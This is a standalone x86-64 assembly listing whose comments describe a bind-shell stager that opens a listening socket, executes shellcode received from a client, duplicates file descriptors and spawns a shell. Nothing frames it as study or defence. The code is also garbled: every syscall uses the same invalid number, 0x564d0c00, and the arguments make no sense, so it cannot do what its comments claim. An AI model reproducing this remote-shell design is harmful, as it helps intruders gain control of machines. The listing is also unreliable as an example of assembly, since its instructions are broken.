```assembly
    section .text
    global _start

_start:
    ; Create a socket
    mov rax, 0x564d0c00
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall

    ; Bind the socket to a port
    mov rax, 0x564d0c00
    mov rdi, rsp
    mov rsi, 0x100007f
    mov rdx, 0x1
    syscall

    ; Listen for incoming connections
    mov rax, 0x564d0c00
    mov rdi, rsp
    mov rsi, 0x100007f
    mov rdx, 0x2
    syscall

    ; Accept an incoming connection
    mov rax, 0x564d0c00
    mov rdi, rsp
    xor rsi, rsi
    syscall

    ; Receive data from the client
    mov rax, 0x564d0c00
    mov rdi, rsp
    mov rsi, rdx
    mov rdx, 8
    syscall

    ; Execute the received data as shellcode
    mov rax, 0x564d0c00
    xor rdi, rdi
    mov rsi, rdx
    xor rdx, rdx
    syscall

    ; Close the listening socket
    mov rax, 0x564d0c00
    mov rdi, rsp
    mov rsi, 0x100007f
    mov rdx, 0x5
    syscall

    ; Duplicate file descriptors
    mov rax, 0x564d0c00
    xor rdi, rdi
    mov rsi, rsp
    mov rdx, 0x0
    syscall

    ; Duplicate file descriptors
    mov rax, 0x564d0c00
    xor rdi, rdi
    mov rsi, rsp
    mov rdx, 0x1
    syscall

    ; Duplicate file descriptors
    mov rax, 0x564d0c00
    xor rdi, rdi
    mov rsi, rsp
    mov rdx, 0x2
    syscall

    ; Execute the received data as shellcode
    mov rax, 0x564d0c00
    xor rdi, rdi
    mov rsi, rdx
    xor rdx, rdx
    syscall

    ; Spawn a shell
    mov rax, 0x564d0c00
    xor rdi, rdi
    mov rsi, 0x100007f
    xor rdx, rdx
    syscall

    ; Exit the program
    mov rax, 0x564d0c00
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    syscall

